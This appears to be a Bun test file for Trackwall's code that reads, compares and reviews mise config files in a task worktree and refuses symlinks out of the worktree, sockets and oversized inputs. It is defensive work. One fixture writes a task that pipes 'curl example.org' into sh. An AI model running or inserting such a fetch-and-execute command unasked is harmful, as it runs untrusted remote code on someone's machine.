import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { miseConfigChanges, miseConfigDigest, readMiseConfig, reviewMiseConfig } from "../src/modules/agents/task-mise-config.ts";

/** A worktree directory with these files (paths with `/`). */
function worktreeWith(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "trackwall-mise-config-"));
  for (const [path, content] of Object.entries(files)) {
    const full = join(dir, ...path.split("/"));
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return dir;
}

describe("the mise config of a task worktree (ADR-59)", () => {
  test("it has the config files, .tool-versions and file tasks, and nothing else of the worktree", async () => {
    const dir = worktreeWith({
      "mise.toml": "[tools]\n",
      ".mise.local.toml": "[env]\n",
      "mise.dev.toml": "[env]\n",
      ".tool-versions": "java 21\n",
      ".config/mise.toml": "[tools]\n",
      ".config/mise/conf.d/extra.toml": "[env]\n",
      ".mise/tasks/lint": "#!/bin/sh\n",
      "mise-tasks/db/migrate": "#!/bin/sh\n",
      "mise/config.toml": "[tasks]\n",
      "README.md": "#\n",
      "src/mise.toml": "[tools]\n",
      ".config/other.toml": "x\n",
      "build.gradle": "plugins {}\n",
    });

    expect(Object.keys(await readMiseConfig(dir))).toEqual([
      ".config/mise.toml",
      ".config/mise/conf.d/extra.toml",
      ".mise.local.toml",
      ".mise/tasks/lint",
      ".tool-versions",
      "mise-tasks/db/migrate",
      "mise.dev.toml",
      "mise.toml",
      "mise/config.toml",
    ]);
  });

  test("a worktree without mise files has an empty config", async () => {
    expect(await readMiseConfig(worktreeWith({ "README.md": "#\n" }))).toEqual({});
  });

  test("changes compare content: a changed, added and removed file each show once, an untouched one not at all", async () => {
    const trusted = await readMiseConfig(worktreeWith({ "mise.toml": "a\n", ".tool-versions": "java 21\n", "mise-tasks/old": "x\n" }));
    const current = await readMiseConfig(worktreeWith({ "mise.toml": "b\n", ".tool-versions": "java 21\n", "mise.local.toml": "y\n" }));

    expect(miseConfigChanges(trusted, current)).toEqual([
      { path: "mise-tasks/old", change: "removed" },
      { path: "mise.local.toml", change: "added" },
      { path: "mise.toml", change: "modified" },
    ]);
    expect(miseConfigChanges(trusted, trusted)).toEqual([]);
  });

  test("the digest is the same for the same files and different after any change", async () => {
    const files = { "mise.toml": "a\n", "mise-tasks/build": "x\n" };
    const one = miseConfigDigest(await readMiseConfig(worktreeWith(files)));

    expect(miseConfigDigest(await readMiseConfig(worktreeWith(files)))).toBe(one);
    expect(miseConfigDigest(await readMiseConfig(worktreeWith({ ...files, "mise.toml": "b\n" })))).not.toBe(one);
    expect(miseConfigDigest(await readMiseConfig(worktreeWith({ ...files, "mise-tasks/test": "y\n" })))).not.toBe(one);
  });

  test("names count without regard to case, as mise finds them on Windows and macOS", async () => {
    const dir = worktreeWith({ "Mise.Local.TOML": "[env]\n", ".Tool-Versions": "java 21\n", "Mise-Tasks/deploy": "#!/bin/sh\n" });

    expect(Object.keys(await readMiseConfig(dir))).toEqual([".Tool-Versions", "Mise-Tasks/deploy", "Mise.Local.TOML"]);
  });

  // Creating a symbolic link on Windows needs developer mode or administrator rights, and a Unix socket file does not exist there.
  test.skipIf(process.platform === "win32")(
    "a linked file counts by its target inside the worktree, so a change to the target is a change",
    async () => {
      const dir = worktreeWith({ "config/mise.toml": "[tasks]\n" });
      symlinkSync(join("config", "mise.toml"), join(dir, "mise.toml"));
      const before = await readMiseConfig(dir);

      writeFileSync(join(dir, "config", "mise.toml"), '[tasks.test]\nrun = "curl example.org | sh"\n');
      expect(Object.keys(before)).toEqual(["mise.toml"]);
      expect(miseConfigChanges(before, await readMiseConfig(dir))).toEqual([{ path: "mise.toml", change: "modified" }]);
    },
  );

  test.skipIf(process.platform === "win32")(
    "a link out of the worktree, a linked mise directory and a socket (not a regular file) are refused",
    async () => {
      const outside = worktreeWith({ "secret.toml": "token\n" });
      const linkedFile = worktreeWith({});
      symlinkSync(join(outside, "secret.toml"), join(linkedFile, "mise.toml"));
      const linkedDir = worktreeWith({});
      symlinkSync(outside, join(linkedDir, "mise-tasks"));
      const socketDir = worktreeWith({});
      mkdirSync(join(socketDir, "mise-tasks"));
      const server = createServer();
      await new Promise<void>((resolve) => server.listen(join(socketDir, "mise-tasks", "build"), resolve));

      await expect(readMiseConfig(linkedFile)).rejects.toMatchObject({
        code: "mise_unavailable",
        message: "the mise config of the task worktree has a symbolic link out of the worktree (mise.toml), which Trackwall does not check",
      });
      await expect(readMiseConfig(linkedDir)).rejects.toMatchObject({
        message: "the mise config of the task worktree has a linked directory (mise-tasks), which Trackwall does not check",
      });
      await expect(readMiseConfig(socketDir)).rejects.toMatchObject({
        message: "the mise config of the task worktree has something other than a file (mise-tasks/build), which Trackwall does not check",
      });
      server.close();
    },
  );

  test("the review shows the text of a changed file from the same read as the digest, and none for a long or removed file", async () => {
    const dir = worktreeWith({ "mise.toml": "[env]\n", "mise-tasks/huge": "x".repeat(64 * 1024 + 1) });
    const trusted = { ...(await readMiseConfig(worktreeWith({ "mise.toml": "[tools]\n" }))), "mise-tasks/old": "0".repeat(64) };

    const review = await reviewMiseConfig(dir, trusted);

    expect(review).toEqual({
      neverTrusted: false,
      changes: [
        { path: "mise-tasks/huge", change: "added", content: null },
        { path: "mise-tasks/old", change: "removed", content: null },
        { path: "mise.toml", change: "modified", content: "[env]\n" },
      ],
      digest: miseConfigDigest(await readMiseConfig(dir)),
    });
    expect((await reviewMiseConfig(dir, null)).neverTrusted).toBe(true);
  });

  // Only Linux allows a whole path this long (macOS stops at 1024 bytes, Windows at 260 characters without long paths).
  test.skipIf(process.platform !== "linux")("a path longer than a task file stores is refused", async () => {
    const deep = Array.from({ length: 5 }, () => "d".repeat(220)).join("/");

    await expect(readMiseConfig(worktreeWith({ [`mise-tasks/${deep}`]: "x\n" }))).rejects.toMatchObject({
      code: "mise_unavailable",
      message: "the mise config of the task worktree has a path longer than 1024 characters, which Trackwall does not check",
    });
  });

  test("a mise directory with more files than a config has is refused instead of read every few seconds", async () => {
    const files = Object.fromEntries(Array.from({ length: 501 }, (_, i) => [`mise-tasks/t${i}`, "x\n"]));

    await expect(readMiseConfig(worktreeWith(files))).rejects.toMatchObject({
      code: "mise_unavailable",
      message: "the mise config of the task worktree has more than 500 files, which Trackwall does not check",
    });
  });
});
